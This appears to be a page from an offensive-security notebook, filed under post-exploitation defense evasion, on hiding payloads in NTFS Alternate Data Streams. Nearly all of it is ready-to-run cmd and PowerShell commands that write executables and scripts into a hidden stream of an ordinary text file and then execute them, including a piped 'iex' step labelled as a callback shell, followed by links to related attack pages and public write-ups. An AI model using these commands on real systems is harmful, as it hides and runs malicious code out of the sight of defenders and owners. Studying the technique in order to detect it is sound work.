# Living off the Land

## 01 - Common Files

![[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/10 - Hidden Artifacts/Hide Artifacts/Windows/Steganography/Helpers#^7e1821]]

## 02 - Command Prompt

Hide the file by appending inside an existing file.

```
C:\> type payload.exe > file.txt:payload.exe

C:\> type payload.bat > file.txt:payload.bat

C:\> type payload.ps1 > file.txt:payload.ps1
```

Execute dropper payloads via ADS.

```
C:\> start file.txt:payload.exe

C:\> wmic.exe process create "c:\path\to\file.txt:payload.exe"
```

Execute script payloads via ADS.

```
C:\> more < file.txt:payload.bat | cmd.exe

C:\> more < file.txt:payload.ps1 | powershell.exe
```

## 03 - PowerShell

Hide the file by appending inside an existing file.

```
PS C:\> Set-Content file.txt -Stream script.ps1 -Value payload.ps1
```

Retrieve the file inside the stream.

```
PS C:\> Get-Item -Path C:\path\to\directory\* -Stream *

PS C:\> Get-Item -Path C:\path\to\directory\file.txt -Stream *
```

Execute Callback Shell via ADS

```
PS C:\> Get-Content file.txt -Stream payload.ps1 | iex
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/DotNET/CSharp/Manual|Initial Access: DotNET Execution]]

- [[HTA|Initial Access: HTA]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Payloads/Desktop/Windows/Installer/MSI/Manual|Initial Access: MSI]]

- [[Scriptlet|Initial Access: Scriptlet]]

- [[Windows Scripting Host|Initial Access: Windows Scripting Host]]

- [[06 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Command Execution/WMI|Initial Access: WMI]]

### Source Repostories

- [r00t-3xp10it: ADS](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md)

### Hacking Articles

- [Hacking Articles: Defense Evasion Alternate Data Streams](https://www.hackingarticles.in/defense-evasion-alternate-data-streams/)

### Jakoby

- [Jakoby: AlternateDataStream](https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/VideoNotes/AlternateDataStream.md)

- [InfoSec Writeups: Alternate Data Streams ADS](https://infosecwriteups.com/alternate-data-streams-ads-54b144a831f1)

- [OddVar Moe: Putting Data in Alternate Data Streams and How to Execute it](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

- [CqureAcademy: Alternate Data Streams](https://cqureacademy.com/blog/alternate-data-streams)

- [ThreatSpike: Alternate Data Streams](https://www.threatspike.com/blogs/alternate-data-streams)

### 0xsp

- [0xsp: handy techniques to bypass environment restrictions](https://0xsp.com/offensive/handy-techniques-to-bypass-environment-restrictions/)